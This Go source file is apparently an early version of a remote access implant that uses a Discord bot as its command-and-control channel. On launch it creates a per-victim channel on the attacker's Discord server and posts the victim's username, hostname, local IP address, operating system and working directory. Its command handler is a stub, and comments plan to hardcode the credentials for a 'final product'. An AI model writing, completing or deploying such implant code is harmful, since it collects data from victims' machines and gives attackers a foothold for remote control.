package main

import (
	"bufio" //Delete in final product as API keys will be hardcoded, not loaded from .env as in my example
	"fmt"
	"log" //Delete later
	"net"
	"os"
	"os/user"
	"runtime"
	"strings"

	"github.com/bwmarrin/discordgo"
)

// Global variable
var myChannelId string
var myGuildId string // Later removed as it will be hardcoded into function

func loadEnvFile(filePath string) (map[string]string, error) {
	envVars := make(map[string]string)

	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.SplitN(line, "=", 2)
		if len(parts) != 2 {
			continue
		}
		envVars[parts[0]] = parts[1]
	}

	return envVars, nil
}
func commandAndControl(session *discordgo.Session, message *discordgo.MessageCreate) {
	if message.ChannelID != myChannelId || message.Author.ID == session.State.User.ID {
		return
	}
}
func discordBot(token string) {
	bot, err := discordgo.New(fmt.Sprint("Bot ", token))
	if err != nil {
		log.Fatal(err)
	}
	// Set intents only for messages
	bot.Identify.Intents = discordgo.IntentsAllWithoutPrivileged

	// Start websocket connection
	err = bot.Open()
	if err != nil {
		log.Fatal(err)
	}

	// Create message handler
	bot.AddHandler(commandAndControl)

	sendInitialData(bot)

	stop := make(chan bool)
	<-stop
}
func sendInitialData(bot *discordgo.Session) {
	// Necessary data to find channel
	OS := runtime.GOOS
	currentUser, _ := user.Current()
	sessionId := fmt.Sprintf("sess-%s-%s", OS, currentUser.Username)
	// Discord string convention
	sessionId = strings.ToLower(strings.ReplaceAll(sessionId, "\\", "-"))

	channels, err := bot.GuildChannels(myGuildId)
	if err != nil {
		fmt.Println("error fetching channels,", err)
		return
	}

	// Search for the channel by name
	var found bool = false
	for _, channel := range channels {
		if channel.Name == sessionId {
			myChannelId = channel.ID
			found = true
			break
		}
	}
	if found {
		// Send message about being active
		bot.ChannelMessageSend(myChannelId, "Online")
	}else{
		// Create new channel
		c, _ := bot.GuildChannelCreate(myGuildId, sessionId, 0) // Guild ID will be hardcoded
		myChannelId = c.ID
		// Get data about user
		hostname, _ := os.Hostname()
		cwd, _ := os.Getwd()
		conn, _ := net.Dial("udp", "8.8.8.8:80")
		defer conn.Close()
		localAddr := conn.LocalAddr().(*net.UDPAddr)
		// Send first message with basic info (and pin it)
		firstMsg := fmt.Sprintf("Session *%s* opened! 🥳\n\n**IP**: %s\n**User**: %s\n**Hostname**: %s\n**OS**: %s\n**CWD**: %s", sessionId, localAddr.IP, currentUser.Username, hostname, runtime.GOOS, cwd)
		m, _ := bot.ChannelMessageSend(myChannelId, firstMsg)
		bot.ChannelMessagePin(myChannelId, m.ID)
	}
}

func main() {
	envVars, err := loadEnvFile(".env")
	if err != nil {
		log.Fatal(err)
	}

	var TOKEN = envVars["DISCORD_TOKEN"]
	myGuildId = envVars["GUILD_ID"]
	discordBot(TOKEN)
}
